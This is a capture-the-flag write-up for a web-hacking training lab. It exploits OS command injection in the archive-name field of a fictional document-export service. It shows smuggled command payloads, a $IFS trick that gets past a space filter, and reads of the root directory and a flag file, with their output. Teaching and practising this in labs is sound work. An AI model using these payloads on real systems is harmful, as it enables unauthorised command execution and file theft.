---

Name: Parchive
Difficulty: Medium
URL: https://dashboard.webverselabs-pro.com/learning-paths/junior-web-hacker/08/parchive
Description: Parchive is a document-archiving SaaS founded in 2020 in Boston for mid-market law firms and audit shops, with seats starting at $89/month and a customer base of around 4,000 active reviewers. The bulk-export feature was rewritten last summer by a contractor who pushed back on the team's request for a whitelist, arguing it would break power-user filenames, the compromise was a small "obvious junk" check on the archive name field. A client flagged some unexpected behaviour in the export endpoint during a routine review. 

---


## Enumeration

The application allows users to download a case folder as a `.tar.gz` archive.

The interesting part is the **Archive Name** field, which is sent to the `/export` endpoint:

```http
POST /export HTTP/1.1
Content-Type: application/x-www-form-urlencoded

case_id=case-7741&archive_name=spider
```

The response contains a download path:

```json
{"success":true,"output":"","download":"/dl/test_name"}
```

Since the application is creating a tar archive, I suspected that the archive name might be passed directly to a shell command.

## Command Injection

I first tested whether I could inject another command by adding `;`:

```text
test_name;id
```

The application returned:

```text
Download test_name;id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

This confirmed **OS command injection** and showed that the commands were being executed as `www-data`.

I then tried:

```text
test_name;ls /
```

However, the space was removed/handled incorrectly, resulting in:

```text
/bin/sh: 1: ls/: not found
```

To bypass the space filtering, I used `$IFS`, which the shell expands to whitespace:

```text
test_name;ls$IFS/
```

This successfully executed `ls /` and returned:

```text
app
bin
boot
dev
entrypoint.sh
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
uploads
usr
var
```

The flag was located at `/flag.txt`.

## Reading the Flag

I used the same `$IFS` technique with `cat`:

```text
test_name;cat$IFS/flag.txt
```

This allowed me to read the contents of `/flag.txt` and complete the challenge.
